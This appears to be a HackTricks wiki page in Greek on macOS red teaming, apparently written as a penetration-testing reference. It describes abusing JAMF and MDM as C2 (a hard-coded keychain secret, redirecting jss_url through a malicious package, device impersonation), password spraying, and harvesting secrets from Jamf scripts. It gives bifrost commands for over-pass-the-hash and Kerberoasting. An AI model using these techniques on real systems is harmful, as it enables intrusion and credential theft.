# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Κατάχρηση MDMs

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Εάν καταφέρετε να **παραβιάσετε διαπιστευτήρια διαχειριστή** για να αποκτήσετε πρόσβαση στην πλατφόρμα διαχείρισης, μπορείτε **δυνητικά να παραβιάσετε όλους τους υπολογιστές**, διανέμοντας το malware σας στα μηχανήματα.

Για Red Teaming σε περιβάλλοντα MacOS συνιστάται ιδιαίτερα να έχετε κάποια κατανόηση του τρόπου λειτουργίας των MDMs:


{{#ref}}
macos-mdm/
{{#endref}}

### Χρήση MDM ως C2

Ένα MDM θα έχει δικαιώματα για εγκατάσταση, αναζήτηση ή αφαίρεση profiles, εγκατάσταση applications, δημιουργία local admin accounts, ορισμό firmware password, αλλαγή του FileVault key...

Για να εκτελέσετε το δικό σας MDM, χρειάζεστε το **CSR σας υπογεγραμμένο από έναν vendor**, κάτι που μπορείτε να προσπαθήσετε να αποκτήσετε μέσω του [**https://mdmcert.download/**](https://mdmcert.download/). Για να εκτελέσετε το δικό σας MDM για Apple devices, μπορείτε να χρησιμοποιήσετε το [**MicroMDM**](https://github.com/micromdm/micromdm).

Ωστόσο, για να εγκαταστήσετε μια application σε μια enrolled device, εξακολουθεί να χρειάζεται να είναι υπογεγραμμένη από έναν developer account... όμως, κατά το MDM enrolment, η **device προσθέτει το SSL cert του MDM ως trusted CA**, οπότε πλέον μπορείτε να υπογράψετε οτιδήποτε.<sup>[[4]](#references)</sup>

Για να κάνετε enrol τη device σε ένα MDM, χρειάζεται να εγκαταστήσετε ένα αρχείο **`mobileconfig`** ως root, το οποίο μπορεί να παραδοθεί μέσω ενός αρχείου **pkg** (μπορείτε να το συμπιέσετε σε zip και, όταν γίνει download από το Safari, θα αποσυμπιεστεί).

Ο **Mythic agent Orthrus** χρησιμοποιεί αυτή την τεχνική.

### Κατάχρηση του JAMF PRO

Το JAMF μπορεί να εκτελεί **custom scripts** (scripts που έχουν αναπτυχθεί από τον sysadmin), **native payloads** (δημιουργία local account, ορισμός EFI password, παρακολούθηση αρχείων/processes...) και **MDM** (device configurations, device certificates...).<sup>[[5]](#references)</sup>

#### JAMF self-enrolment

Μεταβείτε σε μια σελίδα όπως η `https://<company-name>.jamfcloud.com/enroll/` για να δείτε αν έχουν ενεργοποιημένο το **self-enrolment**. Εάν το έχουν, ενδέχεται να **ζητήσει credentials για πρόσβαση**.

Μπορείτε να χρησιμοποιήσετε το script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) για να εκτελέσετε επίθεση password spraying.

Επιπλέον, αφού βρείτε τα σωστά credentials, ενδέχεται να μπορείτε να κάνετε brute-force άλλα usernames με την παρακάτω φόρμα:

![Κατάχρηση του JAMF PRO - JAMF self-enrolment: Επιπλέον, αφού βρείτε τα σωστά credentials, ενδέχεται να μπορείτε να κάνετε brute-force άλλα usernames με την παρακάτω φόρμα](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Το **`jamf`** binary περιείχε το secret για το άνοιγμα του keychain, το οποίο κατά τον χρόνο της ανακάλυψης ήταν **shared** μεταξύ όλων και ήταν: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Επιπλέον, το jamf **παραμένει** ως **LaunchDaemon** στο **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF Device Takeover

Το **URL** του **JSS** (Jamf Software Server) που θα χρησιμοποιήσει το **`jamf`** βρίσκεται στο **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Αυτό το αρχείο περιέχει ουσιαστικά το URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Έτσι, ένας attacker θα μπορούσε να αποθέσει ένα malicious package (`pkg`) που **αντικαθιστά αυτό το αρχείο** κατά την εγκατάστασή του, ορίζοντας το **URL σε έναν Mythic C2 listener από έναν Typhon agent**, ώστε πλέον να μπορεί να κάνει abuse του JAMF ως C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Για να **impersonate την επικοινωνία** μεταξύ μιας συσκευής και του JMF χρειάζεστε:

- Το **UUID** της συσκευής: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Το **JAMF keychain** από: `/Library/Application\ Support/Jamf/JAMF.keychain`, το οποίο περιέχει το certificate της συσκευής

Με αυτές τις πληροφορίες, **δημιουργήστε ένα VM** με το **stolen** Hardware **UUID** και με **απενεργοποιημένο το SIP**, τοποθετήστε το **JAMF keychain**, κάντε **hook** τον Jamf **agent** και κάντε steal τις πληροφορίες του.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Θα μπορούσατε επίσης να κάνετε monitor την τοποθεσία `/Library/Application Support/Jamf/tmp/` για τα **custom scripts** που οι admins μπορεί να θέλουν να εκτελέσουν μέσω Jamf, καθώς **τοποθετούνται εδώ, εκτελούνται και αφαιρούνται**. Αυτά τα scripts **ενδέχεται να περιέχουν credentials**.

Ωστόσο, **credentials** μπορεί να περνούν σε αυτά τα scripts ως **parameters**, επομένως θα πρέπει να κάνετε monitor το `ps aux | grep -i jamf` (χωρίς καν να είστε root).

Το script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) μπορεί να κάνει listen για νέα αρχεία που προστίθενται και για νέα process arguments.

### macOS Remote Access

Και επίσης σχετικά με τα "special" **network** **protocols** του **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Σε ορισμένες περιπτώσεις θα διαπιστώσετε ότι ο **MacOS computer είναι συνδεδεμένος σε ένα AD**. Σε αυτό το σενάριο θα πρέπει να προσπαθήσετε να κάνετε **enumerate** το active directory όπως έχετε συνηθίσει. Βρείτε περισσότερη **βοήθεια** στις ακόλουθες σελίδες:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Ένα **local MacOS tool** που μπορεί επίσης να σας βοηθήσει είναι το `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Υπάρχουν επίσης ορισμένα tools προετοιμασμένα για MacOS, ώστε να κάνουν αυτόματα enumerate το AD και να αλληλεπιδρούν με το kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): Το MacHound είναι extension του Bloodhound audting tool, που επιτρέπει τη συλλογή και εισαγωγή Active Directory relationships από hosts MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Το Bifrost είναι ένα Objective-C project σχεδιασμένο για interaction με τα Heimdal krb5 APIs στο macOS. Στόχος του project είναι να επιτρέψει καλύτερο security testing γύρω από το Kerberos σε macOS devices, χρησιμοποιώντας native APIs, χωρίς να απαιτείται οποιοδήποτε άλλο framework ή package στο target.
- [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript for Automation (JXA) tool για την εκτέλεση Active Directory enumeration.

### Πληροφορίες Domain
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Users

Οι τρεις τύποι χρηστών του MacOS είναι:

- **Local Users** — Διαχειρίζονται από την τοπική υπηρεσία OpenDirectory και δεν συνδέονται με κανέναν τρόπο στο Active Directory.
- **Network Users** — Μεταβαλλόμενοι χρήστες του Active Directory, οι οποίοι απαιτούν σύνδεση στον DC server για authentication.
- **Mobile Users** — Χρήστες του Active Directory με τοπικό backup για τα credentials και τα αρχεία τους.

Οι τοπικές πληροφορίες για τους χρήστες και τις ομάδες αποθηκεύονται στον φάκελο _/var/db/dslocal/nodes/Default._\
Για παράδειγμα, οι πληροφορίες για τον χρήστη με όνομα _mark_ αποθηκεύονται στο _/var/db/dslocal/nodes/Default/users/mark.plist_ και οι πληροφορίες για την ομάδα _admin_ βρίσκονται στο _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Εκτός από τη χρήση των ακμών HasSession και AdminTo, το **MacHound προσθέτει τρεις νέες ακμές** στη βάση δεδομένων του Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** - οντότητα που επιτρέπεται να κάνει SSH στον host
- **CanVNC** - οντότητα που επιτρέπεται να κάνει VNC στον host
- **CanAE** - οντότητα που επιτρέπεται να εκτελεί AppleEvent scripts στον host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Περισσότερες πληροφορίες στο [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ password

Λάβετε passwords χρησιμοποιώντας:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Είναι δυνατό να αποκτήσετε πρόσβαση στον κωδικό πρόσβασης του **`Computer$`** μέσα στο System keychain.

### Over-Pass-The-Hash

Αποκτήστε ένα TGT για έναν συγκεκριμένο χρήστη και service:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Μόλις συλλεχθεί το TGT, είναι δυνατή η εισαγωγή του στην τρέχουσα session με:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Με τα αποκτηθέντα service tickets είναι δυνατό να επιχειρηθεί η πρόσβαση σε shares άλλων υπολογιστών:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Πρόσβαση στο Keychain

Το Keychain πιθανότατα περιέχει ευαίσθητες πληροφορίες, οι οποίες, αν αποκτηθεί πρόσβαση σε αυτές χωρίς τη δημιουργία prompt, θα μπορούσαν να βοηθήσουν στην προώθηση μιας red team άσκησης:


{{#ref}}
macos-keychain.md
{{#endref}}

## Εξωτερικές Υπηρεσίες

Το MacOS Red Teaming διαφέρει από ένα συνηθισμένο Windows Red Teaming, καθώς συνήθως το **MacOS είναι άμεσα ενσωματωμένο με αρκετές εξωτερικές πλατφόρμες**. Μια συνηθισμένη διαμόρφωση του MacOS είναι η πρόσβαση στον υπολογιστή με χρήση **συγχρονισμένων διαπιστευτηρίων OneLogin και η πρόσβαση σε αρκετές εξωτερικές υπηρεσίες** (όπως github, aws...) μέσω του OneLogin.

## Διάφορες red team τεχνικές

### Safari

Όταν γίνεται λήψη ενός αρχείου στο Safari, αν πρόκειται για «ασφαλές» αρχείο, θα **ανοιχτεί αυτόματα**. Για παράδειγμα, αν **κατεβάσετε ένα zip**, θα αποσυμπιεστεί αυτόματα:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Αναφορές

- [1] [Gone Apple Pickin': Red Teaming σε περιβάλλοντα MacOS το 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Παρουσίαση του MacHound: Μια λύση για επιθέσεις βασισμένες στο macOS Active Directory](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Εντολές απαρίθμησης Domain (ισοδύναμες των dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Ελάτε στη σκοτεινή πλευρά, έχουμε Apples: Μετατρέποντας τη διαχείριση του macOS σε κακόβουλη](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: «Η οπτική ενός επιτιθέμενου στις διαμορφώσεις Jamf» - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
